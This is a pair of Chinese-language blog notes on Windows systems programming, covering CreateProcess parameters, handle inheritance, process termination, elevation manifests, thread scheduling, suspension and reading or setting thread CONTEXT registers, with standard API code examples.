在进程被完全初始化之前，CreateProcess返回TRUE。这意味着操作系统加载程序尚未找出所需要的DLL。如果一个DLL无法找到，或者未能正确初始化，那么该进程就终止运行。由于CreateProcess返回TRUE，因此父进程不知道出现的任何初始化问题。 pszApplicationName和pszCommandLine前者是新进程可执行文件的名字 后者是要传递给新进程的命令行参数。CreateProcess实际会修改我们传给它的命令行字符。但在CreateProcess返回之前，它会将此字符还原成原来的形式。 这是很重要的，不能传递只读内存区。否则可能会报错 1234567891011#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main(int argc,TCHAR* argv[],TCHAR * env[]){ STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi; CreateProcess(NULL, TEXT(&quot;NOTEPAD&quot;), NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi); return 0;} 在调用之前将字符串常量复制到一个临时变量则不会报错。 123456789101112#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main(int argc,TCHAR* argv[],TCHAR * env[]){ STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi; TCHAR szCommandLine[] = TEXT(&quot;NOTEPAD&quot;); CreateProcess(NULL, szCommandLine, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi); return 0;} 如果调用Windows 2000上CreateProcess的ANSI版本，就不会违规访问，因为系统已经制作了一个命令行字符串的临时拷贝。 可以使用pszApplicationName参数设定一个完整的命令行，以便于CreateProcess用来创建新的进程。当CreateProcess分析pszCommandLine字符串的时候，它将查看字符串中的第一个标记，并假设该标记是想运行的可执行文件的名字。如果可执行文件没有扩展名，那么假设它为.exe，CreateProcess也按照下面的顺序搜索可执行文件： 包含调用进程的.exe文件的目录 调用进程的当前目录 Windows的系统目录 Windows目录 PATH环境变量中列出的目录 当然如果包含了绝对路径，则会直接使用绝对路径来查找可执行文件。 只要pszApplicationName设置为NULL，就会发生上述情况。 也可以在pszApplicationName只指定应用程序的名字，但是必须指定扩展名。CreateProcess假定当前目录，除非文件名之前有指定目录。并且CreateProcess不会在其他路径查找文件。 psaProcess、psaThread和binheritHandles若要创建一个新进程，系统必须创建一个进程内核对象和一个线程内核对象（用于进程的主线程），由于这些都是内核对象，因此父进程可以得到机会将安全属性与这两个对象关联起来。 可以使用pasProcess和pasThread参数分别设定进程对象和线程对象需要的安全性，可以为NULL，在这种情况下，系统为这些对象赋予默认安全性描述符 为psaProcess和psaThread参数使用SECURITY_ATTRIBUTES结构可以使其支持继承（继承父进程的句柄表） 一个继承的例子： 进程A创建了进程B并且设置进程B的进程内核对象可继承、主线程内核对象不可继承。（两个对象在进程B创建以后会更新A的句柄表，并且可以看到两个内核对象的继承标志） 由于创建进程B的时候CreateProcess的binheritHandles设置为FALSE，所以进程B不会继承进程A中的任何“可继承”的内核对象。 接着进程A又创建了进程C，并设置CreateProcess的两个SECURITY_ATTRIBUTES为NULL，表明进程C的进程对象和线程对象在进程A的句柄表中是不可被继承的。 创建进程C的时候CreateProcess设置binheritHandles为TRUE，此时进程C将继承进程A中的所有继承内核对象。这里有之前创建的进程B的内核对象，但不包含进程B的主线程和内核对象。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// Prepare a STARTUPINFO structure for spawning process.STARTUPINFO si = { sizeof(si) };SECURITY_ATTRIBUTES saProcess, saThread;PROCESS_INFORMATION piProcessB, piProcessC;TCHAR szPath[MAX_PATH];// Prepare to spawn Process B from Process A.// The handle identifying the new process// object should be inheritable.saProcess.nLength = sizeof(saProcess);saProcess.lpSecurityDescriptor = NULL;saProcess.bInheritHandle = TRUE;// The handle identifying the new thread// object should NOT be inheritable.saThread.nLength = sizeof(saThread);saThread.lpSecurityDescriptor = NULL;saThread.bInheritHandle = FALSE;// Spawn Process B._tcscpy_s(szPath, _countof(szPath), TEXT(&quot;ProcessB&quot;));CreateProcess(NULL, szPath, &amp;saProcess, &amp;saThread, FALSE, 0, NULL, NULL, &amp;si, &amp;piProcessB);// The pi structure contains two handles// relative to Process A:// hProcess, which identifies Process B's process// object and is inheritable, and hTrhead, which identifies// Process B's primary thread object and is NOT inheritable.// Prepare to spawn Process C from Process A.// Since NULL is passed for the psaProcess and psaThread// parameters, the handle to Process's process and// primary thread objects default to &quot;noninheritable.&quot;// If Process A were to spawn another process, this new// process would NOT inherit handles to Process's process// and thread object.// Because TRUE is passed for the bInheritHandles parameter,// Process C will inherit the handle that identifies Process// B's process object but will not inherit a handle to// Process B's primary thread object._tcscpy_s(szPath, _countof(szPath), TEXT(&quot;ProcessC&quot;));CreateProcess(NULL, szPath, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;piProcessC); fdwCreatefdwCreate参数影响了创建新进程创建方式的flag DEBUG_PROCESS 标志父进程希望调试子进程以及子进程将来创建的所有进程。（父进程现在的身份是调试器） DEBUG_ONLY_THIS_PROCESS 最近创建的一个进程会通知父进程。而其创建的子进程将不会通知父进程。 CREATE_SUSPENDED 让系统创建新进程的同时挂起子进程的主线程。这样父进程就可以修改子进程地址空间中的内存，更改子进程主线程的优先级，或者在进程执行任何代码以前将次进程添加到一个作业中。父进程修改好子进程，可以调用ResumeThread函数来允许子进程执行代码。 DETACHED_PROCESS 标志阻止一个基于CUI的子进程访问其父进程的控制台窗口，并告诉系统它的输出发送到一个新的控制台窗口。 通常一个一个CUI进程创建了一个新的CUI子进程，那么默认情况下新进程也会使用父进程的控制台。如果指定了此标志那么子进程必须调用AllocConsole来创建自己的控制台。 CREATE_NEW_CONSOLE,会自动为子进程创建自己的CONSOLE不能和DETACHED_PROCESS一起使用。 CREATE_NO_WINDOW 标志应用程序不要为子进程创建任何控制台，用于执行没有用户界面的程序。 CREATE_NEW_PROCESS_GROUP 对CUI程序而言的。用于创建新进程组。在同一组中的所有进程，当按下Ctrl+C中断当前操作时，系统会向这个组的进程发出通知。 CREATE_DEFAULT_ERROR_MODE 新进程不会继承父进程的错误模式 CREATE_SEPARATE_WOW_VDM 表明创建一个16位windows程序（Virtual DOS Machine） 默认创建的16位进程会共享一个VDM（因为创建一个会消耗较多的资源） CREATE_SHARED_WOW_VDM 在运行16位应用程序才有用， 可以修改注册表 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\WOW\\ DefaultSeparateVDM 设置为yes 可以调用IsWow64Process 来判断检测进程句柄是不是32位进程（在64bit系统下） CREATE_UNICODE_ENVIRONMENT 告诉系统子进程的环境块包含UNICODE字符，进程环境块默认包含ANSI字符 CREATE_FORCEDOS 强制系统运行嵌入一个在16位OS中的MS-DOS程序 CREATE_BREAKAWAY_FROM_JOB 允许一个作业中的进程生成一个和作业无关的进程 EXTENDED_STARTUPINFO_PRESENT 告知操作系统传给psiStartInfo参数的是STARTUPINFOEX结构 fdwCreate还运行给进程分配优先级。但是大部分应用没这个必要。 低IDLE_PRIORITY_CLASS 低于标准BELOW_NORMAL_PRIORITY_CLASS 标准NORMAL_PRIORITY_CLASS 高于标准ABOVE_NORMAL_PRIORITY_CLASS 高HIGH_PRIORITY_CLASS 实时REALTIME_PRIORITY_CLASS pvEnvironmentpvEnvironment参数指向一块内存，其中包含新进程要使用的环境字符串。大多数时候这个参数传入NULL， 子进程会继承其父进程使用的一组环境字符串。 还可以通过GetEnvironmentString函数获得父进程的环境块的串地址，传递给CreateProcess用于创建子进程。 该功能和传入NULL的行为一致。 不使用环境字符串的时候调用FreeEnvironmentStrings释放其空间。 pszCurDir允许父进程设置当前进程的当前驱动器和目录。如果为NULL则默认和主进程一致。如果非NULL pszCurDir必须执行一个以’\\0’结尾的字符串，其中包含了工作驱动器和目录。 psiStartInfo参数指向一个STARTUPINFO 或者 STARTUPINFOEX的结构体 123456789101112131415161718192021typedef struct _STARTUPINFOW { DWORD cb; LPWSTR lpReserved; LPWSTR lpDesktop; LPWSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;} STARTUPINFOW, *LPSTARTUPINFOW; 12345typedef struct _STARTUPINFOEXW { STARTUPINFOW StartupInfo; LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;} STARTUPINFOEXW, *LPSTARTUPINFOEXW; 默认值只要生成次结构 STARTUPINFO si = {sizeof(si)}; CreateProcess(…, &amp;si, …); 如果没有把结构内容清0，则成员将包含线程栈上的垃圾数据。会造成CreateProcess 未知运行结果。 关于dwFlags成员，包含一组标志用于修改子进程的创建方式。 另外还有两个标志 STARTF_FORCEONFEEDBACKCreateProcess会监控进程的初始化过程，并根据结果更改光标的形状。一旦子进程调用了GetMessage（表明初始化完毕）CreateProcess则停止监控。 START_FORCEOFFFEEDBACK 改为等待图标 在启动进程时候控制鼠标指针。CreateProcess临时将系统的护镖指针改为 加载等待 图片 wShowWindow会作为参数传递给子进程WinMain函数中的nCmdShow参数。 可能值是SW_SHOWNORMAL, SW_SHOWMINNOACTIVE 和 SW_SHOWDEFAULT 也可以在应用程序的快捷方式中修改此值。 Microsoft为了避免创建多个CreateProcess版本，仅仅是通过扩展STARTUPINFOEX结果来升级新的feature。 STARTUPIINFOEX保护一个字段 lpAttributeList用于传递额外属性。 PROC_THREAD_ATTRIBUTE_HANDLE_LIST 该属性告知CreateProcess进程究竟应该继承哪一些内核对象的句柄。这些对象句柄必须在创建时指定可继承（SECURIT_ATTRIBUTES结构中保护设置为TRUE的bInheritHandle字段）。 使用这个属性，子进程只能继承一组选定的句柄，而不是继承所有可继承的句柄。 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 自行指定进程成为当前要创建的进程的父进程。 但是不改变调试关系。调用CreateProcess的进程仍然能收到调试通知。 调用以下函数两次，才能创建一个空白的属性列表。 lpAttributeList是之前初始化的attribute列表， 他接受PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 或者 PROC_THREAD_ATTRIBUTE_HANDLE_LIST的值。如果是前者pValue 必须执行一个变量的地址，包含了新的父进程句柄，而cbSize应该使用sizeof(HANDLE)作为其值。 如果是后者pValue必须执行一个数组的起始地址，包含了运行进程访问的，可继承的内核对象句柄， cbSize = sizeof(HANDLE)*句柄数。 dwFlags, PreviousValue和pReturnSize是保留参数，必须设定为0，NULL和NULL 一个初始化Attributelist 并使用STARTUPINFOEX创建进程的例子 创建了一个mutex 并设定AttributeList让子进程继承此Mutex 最后应用程序可以调用以下函数获得STARTUPINFO结构的一个副本。此结构是由父进程初始化的。子进程可以检查这个结构并根据成员值来修改其行为。VOID GetStartupInfo(LPSTARTUPINFO pStartupInfo); StartupInfo中的一些句柄值在父进程中创建的，其地址是父进程的地址空间。 ppiProcInfo指向一个PROCESS_INFORMATION的结构 1234567typedef struct _PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId;} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; CreateProcess返回的与当前进程相关的 进程内核对象句柄 和 线程内核对象句柄。引用计数器为1. 而CreateProcess内部打开这些对象引用计数器又会加1因此若要让子进程和子进程的主线程在父进程退出之前关闭，子进程必须先终止（引用计数器-1）必须在父进程中调用CloseHandle将其引用计数器再-1. 释放子进程的主线程内核对象同理。 注意：关闭句柄并不会真正关闭子进程和子线程（只改变其引用计数器）！ 进程会被操作系统分配一个独一无二的ProcessID， PID=0 是System Idle Process 其线程数等于CPU数量 PID主要供一些系统工具辨识进程使用。 PID由操作系统管理会被回收分配和重用。所以要特备注意。 GetCurrentProcessId获得PID GetCurrentThreadId 获得当前正在运行线程的ID 根据指定句柄获得PID GetProcessId 根据指定句柄获得线程ID GetThreadId 获得当前线程所在进程的PID GetProcessIdOfThread ToolHelp函数允许进程通过PROCESSENTRY32 结构查询其父进程的PID。 但是由于PID具有实效性，可能不准确。最好使用内核对象，窗口句柄等来定位一个进程的父进程。 如果一定要使用PID，唯一的办法就是保证进程或线程的内核对象不被销毁。（例如将父进程的内核对象继承给子进程） 在不需要使用以后调用CloseHandle 终止进程4种方式可以终止进程： 主线程的入口点函数返回 进程中有一个ExitProcess函数 另一个进程中的线程调用TeaminateProcess函数 进程中的线程全部“自然死亡” 主线程的入口点函数返回应该确保只有在主线程的入口点函数返回之后，这个应用程序才终止。这样主线程的所以资源才能被正确清理。确保以下操作会被执行 该线程创建的任何C++对象都将由这些对象的析构函数正确销毁 操作系统将正确释放线程栈使用的内存 系统将进程的退出代码（在进程的内核对象中维护）设为入口点函数的返回值 系统递减内核对象使用计数器 ExitProcess当进程中的一个线程调用ExitProcess函数时，进程便结束运行： 12void ExitProcess(UNIT fuExitCode); 该函数用于终止进程的运行，并将进程的退出代码设置为fuExitCode。ExitProcess函数并不返回任何值，因为进程已经终止运行。如果在调用ExitProcess之后又增加了代码，那么这段代码是永远不会被运行的。 Windows SDk文档声明，进程要等到所有线程终止运行以后才终止运行。如果在入口点调用的ExitThread，而不是调用ExitProcess或者仅仅是返回，那么应用程序的主线程将停止运行，但是如果进程中至少还有一个线程在运行，该进程不会终止运行。 1234567891011121314151617181920#include &lt;tchar.h&gt;#include &lt;windows.h&gt;#include &lt;stdio.h&gt; class CSomeObj{public: CSomeObj() { printf(&quot;Constructor \\n&quot;); } ~CSomeObj() { printf(&quot;Destructor \\n&quot;); }}; CSomeObj g_GlobalObj; int _tmain(int argc, TCHAR* argv[], TCHAR * env[]){ CSomeObj LocalObj; ExitProcess(0); return 0;} 全局对象和局部对象都没有调用析构函数，C++对象没有被正确析构，因为ExitProcess造成进程当场终止运行。C/C++运行库没有机会执行清理工作。 只需要主线程的入口函数返回，C/C++运行库就能执行其清理工作。 所以不要显示调用ExitProcess和ExitThread TerminateProcess调用TerminateProcess也可以终止一个进程 12345678WINBASEAPIBOOLWINAPITerminateProcess( _In_ HANDLE hProcess, _In_ UINT uExitCode ); 任何线程都可以调用TerminateProcess来终止另一个进程或者自己的进程。 hProcess指定了要终止的进程的句柄。其退出代码的值就是传给uExitCode的值。被终止的进程得不到自己要被终止的通知–应用程序不能正确清理，也不能阻止它自己被强行终止。例如这种情况下进程不能将它在内存中的信息flush到磁盘上。 操作系统在进程终止以后会进行彻底清理，保证不会泄露任何操作系统资源。在进程终止后绝对不会泄漏任何东西。 TerminateProcess函数是异步的，并不等到进程完全终止了才返回。为了确定进程是否终止需要使用WaitForSingleObject 当进程中的所有线程终止时当进程的所有线程终止时，操作系统认为没有任何理由再保持进程的地址空间。并会终止这个进程。进程的退出代码会被设置为最后一个终止的哪个线程的退出代码。 当进程终止运行时一个进程终止时，系统回依次执行以下操作。 终止进程中驻留的任何线程 释放进程分配的所有用户对象和GDI对象，关闭所有内核对象（如果没有其他进程打开这些内核对象的句柄，那么他们会被销毁。否则引用计数器-1） 进程的退出代码从STILL_ACTIVE变为传给ExitProcess或TerminateProcess函数的代码 进程内核对象状态变为已触发状态 进程内核对象引用计数器-1 当父进程忘记关闭子进程句柄时候，子进程即使结束。其进程内核对象句柄仍然不会被销毁。此时可以获得一些统计信息，例如GetExitCodeProcess来获得一个已经终止的进程的退出代码。 12345678WINBASEAPIBOOLWINAPIGetExitCodeProcess( _In_ HANDLE hProcess, _Out_ LPDWORD lpExitCode ); 如果被调用的进程未终止，lpExitCode会返回 STILL_ACTIVE(0x103) 重点，如果对进程的统计数据不再感兴趣应该调用CloseHandle来递减内核对象的使用计数器，并释放它。 子进程为了执行复杂的任务而不让当前线程一直等待，可以创建一个新的进程来完成工作。父进程和子进程之间可以进行一些数据共享。 （DDE dynamic Data Exchange） OLE， 管道， 邮件槽等。共享数据最方便的方式就是使用内存映像文件（CreateFileMapping） 以阻塞方式运行子进程 以下代码创建了一个子进程，并等待子进程完成相应的工作正常结束以后，再继续当前线程的执行。 12345678910111213141516171819PROCESS_INFORMATION pi;DWORD dwExitCode;//Spawn the child process.BOOL fSuccess = CreateProcess(..., &amp;pi);if (fSuccess) { // Close the thread handle as soon as it is no longer needed! CloseHandle(pi.hThread); // Suspend our execution until the child has terminated. WaitForSingleObject(pi.hProcess, INFINITE); // The child process terminated; get its exit code. GetExitCodeProcess(pi.hProcess, &amp;dwExitCode); // Close the process handle as soon as it is no longer needed. CloseHandle(pi.hProcess);} 上面的例子使用了WaitForSingleObject函数，该函数会一直等待直到hObject参数所表示的对象变为已触发。 进程对象在终止的时候会变为已触发。 WaitForSingleObject将会挂起当前线程，直到子进程终止。 一个良好的编程习惯：在不需要使用子进程的相关内核对象应该立即CloseHandle。 否则假定子进程生成了另外一个新的子进程，而自己的主线程已经退出。由于调用CreateProcess的当前进程未释放子进程的进程对象，因此自进程的内核对象不会被操作系统释放。 运行独立的子进程 大多数时候应用程序将另一个进程作为独立的进程（detached process）来启动。这就意味着一旦子进程创建，父进程就不再与其通信，或者不必等他它完成工作之后再继续自己的工作（当前进程不必挂起等待）。这时候只需要调用CloseHandle关闭子进程的进程句柄和主线程句柄。 123456789101112PROCESS_INFORMATION pi;//Spawn the child process.BOOL fSuccess = CreateProcess(..., &amp;pi);if (fSuccess) { // Allow the system to destroy the process &amp; thread kernel // objects as soon as the child process terminates. // Close the thread handle as soon as it is no longer needed! CloseHandle(pi.hThread); CloseHandle(pi.hProcess);} 管理员以标准用户权限运行时每个用户登录windows以后会有一个安全令牌（Security token）其后该用户启动的进程都拥有此令牌的权限。 由于许多windows用户使用Administrator登录，此用户的权限太高（可以修改系统文件）可能导致操作系统以高权限执行而已软件而破坏操作系统。 在Vista以上用户以Administrator登录出来具有高特权的安全令牌，还会具有一个筛选过的令牌（filtered token） 只有普通的标准用户权限（standard user）。 之后从第一个进程开始所有启动的进程都和筛选过的令牌相关联。因此默认运行的应用程序将无法访问受限资源。 可以在进程启动之前（进程边界， 进程已经启动以后会与筛选过的令牌相关联并且运行时不可修改）让操作系统提示用户取得提升权限的同意。也可以在快捷菜单中选择以管理员身份运行。 可以在自己的应用程序上显示一个盾牌图，会弹出一个权限提升对话框。 Windows只允许进程边界上进行权限提升（未启动以前）。 可以用一个未提升权限的进程来生成另一个提升了权限的进程，后者将包含一个com服务器，这个新进程将保持活动状态。这样未提升权限的进程就可以向已经提升权限的进程发出IPC调用，而不必启动一个新的实例再终止它自身。 自动提升进程的权限windows每次启动应用程序都将自动弹框询问并提升应用程序的权限（比如安装程序） 在可执行文件中嵌入资源(RT_MANIFEST) 系统会检查段 12345678&lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt; &lt;security&gt; &lt;requestedPrivileges&gt; &lt;requestedExecutionLevel level=&quot;requireAdministrator&quot;/&gt; &lt;/requestedPrivileges&gt; &lt;/security&gt; &lt;/trustInfo&gt; 也可以保存成一个 应用程序.exe.manifest的文件的外部清单 如果exe本身内嵌了一个清单，则外部清单会被忽略。 也可以自行设定应用程序默认以管理员权限运行 枚举系统正在运行的进程Windows在注册表中维护一个性能数据库，包含海量信息。例如RegQueryValueEx把注册表的根目录设为KEY_PERFORMANCE_DATA 但是该数据库在Win95和98上不可用， 没有自己的函数，使用注册表函数 数据库信息布局非常复杂 为了更方便访问此数据库借助Performance Data Helper（PDH.dll） 在（Win9X中 使用ToolHelp API的Process32First 和Process32Next函数） 在WinNT中使用EnumProcess函数。 在Win2000开始Tool Help函数支持2K以上的NT内核系统。","link":"/2019/08/27/Windows-Kernel-4/"},{"title":"Windows-Kernel-7","text":"线程调度、优先级和亲缘性 CONTEXT反应了线程上一次执行时CPU寄存器的状态。 大约每间隔20ms （GetSystemTimeAdjustment函数的第二个参数返回值），windows都会查看当前存在的线程内核对象。在这些对象中，只有一些被认为是可调度的。Windows在可调度的线程内核对象中选择一个，并将上次保存的CONTEX载入寄存器。 这一操作被称为上下文切换（CONTEXT switch）。 windows会记录每个线程运行的次数。 又过了大约20ms，windows将cpu寄存器存回线程的上下文，线程不再运行。系统再次检查剩下可调度的线程内核对象，选择另一个线程的内核对象，载入CONTEXT到寄存器，然后继续。 Windows之所以称为抢占式多线程操作系统（preemptive multithreaded operating system）系统可以在任何时候停止一个线程而另行调度另一个线程。 Windows只调度可调度线程，如果线程挂起计数器大于0，这意味改线程已经被挂起，不应该给其调度任何CPU时间。 还有很多线程在等待事件。 暂停和恢复线程的运行线程内核对象中有一个值表示挂起计数。用CreateProcess或CreateThread创建线程时，默认挂起计数为1.然后执行线程初始化工作。 线程初始化完成以后，CreateProcess或CreateThread会检查是否有CREATE_SUSPENDED标志传入。如果有会重新让线程处于挂起状态。否则将挂起计数器设置为0.线程成为可调度。 可以通过ResumeThread 用于递减线程的挂起计数器。该函数返回线程内核对象的前一个挂起计数。如果线程是非挂起状态，则返回0xFFFFFFFF DWORD SuspendThread(HANDLE hThread);可以用于挂起线程。 可以挂起自身和别的线程。返回之前的线程挂起计数。 一个线程最多可以挂起MAXIMUM_SUSPEND_COUNT次数（winnt.h定义为127）。 实际开发中，随时调用SuspendThread必须小心，如果目标线程在分配堆内存，线程将锁定堆。将其挂起将导致其他线程不可访问堆。必须等其恢复。 所以必须明确知道目标线程在做什么采取完备的措施才可将其挂起。 暂停和恢复进程的运行其实Windows中并不存在进程的挂起和恢复的概念，因为windows 从来不会给进程调度cpu时间。有时候需要挂起进程中的所有线程例如调式代码。 调试器处理WaitForDebugEvent返回的调试事件时，windows将挂起目标进程的所有线程。直到调试器调用ContinueDebugEvent。 也可以使用Process Explorer的Suspend Process来挂起目标进程中的所有线程。 作者自己实现的SuspendProcess函数 123456789101112131415161718192021222324252627282930313233VOID SuspendProcess(DWORD dwProcessID, BOOL fSuspend) { // Get the list of threads in the system. HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, dwProcessID); if (hSnapshot != INVALID_HANDLE_VALUE) { // Walk the list of threads. THREADENTRY32 te = { sizeof(te) }; BOOL fOk = Thread32First(hSnapshot, &amp;te); for (; fOk; fOk = Thread32Next(hSnapshot, &amp;te)) { // Is this thread in the desired process? if (te.th32OwnerProcessID == dwProcessID) { // Attempt to convert the thread ID into a handle. HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID); if (hThread != NULL) { // Suspend or resume thre thread. if (fSuspend) SuspendThread(hThread); else ResumeThread(hThread); } CloseHandle(hThread); } } CloseHandle(hSnapshot); }} 利用Toolhelp32函数来枚举系统中的线程列表。找到属于某个进程的线程，使用OpenThread来打开该线程的内核对象句柄， SuspendProcess不能随时调用，因为在枚举线程集合的时候，会有新线程被创建，也可能有线程被销毁。这样可能目标进程创建的新线程不会被挂起。 在调用SuspendThread的时候可会恢复一个未挂起的线程。更糟糕的是在枚举线程ID时，可能会销毁一个已有的线程，创建一个新的线程，而这两个线程恰好ID相同。这样的话函数将挂起任意一个线程。所以在使用前谨慎了解目标进程的运行情况。 睡眠方式线程也可以告诉系统，它不想在某个时间段内被调度。通过Sleep函数实现 1VOID Sleep(DWORD DwMilliseconds); 该函数可使线程暂停自己的运行，直到dwMilliseconds过去为止 Sleep的问题： 调用Sleep，可使线程自愿放弃它剩余的时间片 系统设置的不可调度时间只是近似于所设定的毫秒数。 可以调用Sleep并传递INFINITE，告知系统永远不要调度这个线程。（没意义，不如直接退出进程释放系统资源） Sleep 0 告知系统放弃当前的时间片的剩余部分，强制调度其他线程。 切换到另一个线程系统提供了一个称为SwitchToThread的函数，使得另一个可调度线程（如果存在能够运行）： 1BOOL SwitchToThread(); 当调用这个函数的函数的时候，系统要查看是否存在一个迫切需要CPU实际的进程。 该函数允许一个需要资源的线程强制另一个优先级较低、而目前拥有该资源的线程放弃该资源。和Sleep（0）类似，差别是SwitchToThread允许优先级较低的线程运行。 线程的运行时间有时候想要计算线程执行某个任务需要多长的时间。但是在抢占式操作系统中，永远无法知道线程何时被赋予CPU时间。当取消线程的CPU时间时，就更加难以计算。所以Windows提供了一个GetThreadTimes的函数，它能返回这些时间。 123ULONGLONG qwStartTime = GetTickCount64；ULONGLONG qwElapsedTime = GetTickCount64() - qwStartTime; 这个代码有一个前提，代码执行不会被中断。 12345678910WINBASEAPIBOOLWINAPIGetThreadTimes( _In_ HANDLE hThread, _Out_ LPFILETIME lpCreationTime, _Out_ LPFILETIME lpExitTime, _Out_ LPFILETIME lpKernelTime, _Out_ LPFILETIME lpUserTime ); GetProcessTimes 类似GetThreadTimes 用于进程中的所有线程。该函数统计了进程中的所有线程的使用时间总和。在Vista以上系统不再依赖10-·15ms间隔的始终计时器来为线程分配cpu时间，而是采用64位时间截计时器（Time Stamp Counter，TSC） QueryThreadCycleTime 和 QueryProcessCycleTime 返回指定线程和指定进程中所有线程所使用的时钟周期数。 如果想更精确代替GetTickCount64， 使用ReadTimeStampCounter宏获取当前TSC值。 要进行高精度的性能分析GetThreadTimes函数仍然不够。采用以下函数 运用环境结构CONTEXT记录了CPU的各种寄存器状态，以方便线程可以从停止状态继续运行。但CONTEXT是CPU相关的。 Winnt.h中定义的CONTEXT结构 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495//// Context Frame//// This frame has a several purposes: 1) it is used as an argument to// NtContinue, 2) is is used to constuct a call frame for APC delivery,// and 3) it is used in the user level thread creation routines.//// The layout of the record conforms to a standard call frame.// typedef struct _CONTEXT { // // The flags values within this flag control the contents of // a CONTEXT record. // // If the context record is used as an input parameter, then // for each portion of the context record controlled by a flag // whose value is set, it is assumed that that portion of the // context record contains valid context. If the context record // is being used to modify a threads context, then only that // portion of the threads context will be modified. // // If the context record is used as an IN OUT parameter to capture // the context of a thread, then only those portions of the thread's // context corresponding to set flags will be returned. // // The context record is never used as an OUT only parameter. // DWORD ContextFlags; // // This section is specified/returned if CONTEXT_DEBUG_REGISTERS is // set in ContextFlags. Note that CONTEXT_DEBUG_REGISTERS is NOT // included in CONTEXT_FULL. // DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_FLOATING_POINT. // FLOATING_SAVE_AREA FloatSave; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_SEGMENTS. // DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_INTEGER. // DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_CONTROL. // DWORD Ebp; DWORD Eip; DWORD SegCs; // MUST BE SANITIZED DWORD EFlags; // MUST BE SANITIZED DWORD Esp; DWORD SegSs; // // This section is specified/returned if the ContextFlags word // contains the flag CONTEXT_EXTENDED_REGISTERS. // The format and contexts are processor specific // BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION]; } CONTEXT; CONTEXT_CONTROL包含CPU的控制寄存器，比如Eip（指令指针），Esp（栈指针），Eflags（标志寄存器）和函数返回地址CONTEXT_INTEGER标识CPU的整数寄存器EAX, EBX, ECX, EDX, ESI, EDI CONTEXT_SEGMENTS标识CPU的段寄存器ES，DS，FS，GS （FS，GS是80386新增加的两个段寄存器，辅助使用以减轻ES段寄存器的压力） CONTEXT_DEBUG_REGISTERS表示CPU的调试寄存器 CONTEXT_EXTENDED_REGISTERS标识CPU的扩展寄存器 Windows允许我们查看线程内核对象内的CONTEXT数据结构。可以使用GetThreadContext函数。 1234567WINBASEAPIBOOLWINAPIGetThreadContext( _In_ HANDLE hThread, _Inout_ LPCONTEXT lpContext ); 先分配一个CONTEXT结构的变量，初始化一些标志ContextFlags成员 以表示要获取哪些寄存器，再将其地址传递给GetThreadContext。 另外在获取CONTEXT之前需要先SuspendThread先将目标线程挂起。否则若目标线程正好被CPU调度则获取的CONTEXT和实际情况就不一致了。 系统允许一个线程有两个CONTEXT，用户模式和内核模式。GetThreadContext只允许访问用户模式的CONTEXT 因此，若目标线程正在内核模式下运行（比如malloc函数进入内核申请堆，并不会响应SuspendThread），调用了SuspendThread将其挂起，实际上线程还没有暂停。但是他不会再执行用户模式的代码。我们可以认为线程已经暂停，这是调用GetThreadContext是非常安全的。 ContextFlags成员仅仅告诉GetThreadContext函数要获取哪些寄存器。例如要获取控制寄存器 123456789101112// Create a CONTEXT structure.CONTEXT Context = { 0 }; // Tell the system that we are interested in only the // control registers.Context.ContextFlags = CONTEXT_CONTROL; // Tell the system to get the registers associated with a thread.GetThreadContext(hThread, &amp;Context); // hThread is the target thread kernel object.// Thre control register members in the CONTEXT structure// reflect the thread's control registers. The other members// are undefined. 如果想获取线程的控制寄存器和整数寄存器，可以这样初始化 123// Tell the system that we are interested in only the // control registers.Context.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER; 获取所有寄存器 123// Tell the system that we are interested in only the // control registers.Context.ContextFlags = CONTEXT_FULL; Windows还允许修改的线程的CONTEXT 1234567WINBASEAPIBOOLWINAPISetThreadContext( _In_ HANDLE hThread, _In_ CONST CONTEXT * lpContext ); 同样在执行之前需要先SuspendThread目标线程。否则会引起不可预料的后果 12345678910111213141516171819202122232425262728293031// Create a CONTEXT structure.CONTEXT Context = { 0 };// Stop the thread from running.SuspendThread(hThread);// Tell the system that we are interested in only the // control registers.Context.ContextFlags = CONTEXT_CONTROL;// Tell the system to get the registers associated with a thread.GetThreadContext(hThread, &amp;Context); // hThread is the target thread kernel object.// Thre control register members in the CONTEXT structure// reflect the thread's control registers. The other members// are undefined.// Make the instruction pointer point to the address of your choice.// Here I've arbitrarily set the address instruction pointer to// )x00010000.Context.Eip = 0x00010000;// Set the thread's register to reflect the changed values.// It's not really necessary to reset the ContextFlags member// because it was set eralier.Context.ContextFlags = CONTEXT_CONTROL;SetThreadContext(hThread, &amp;Context);// 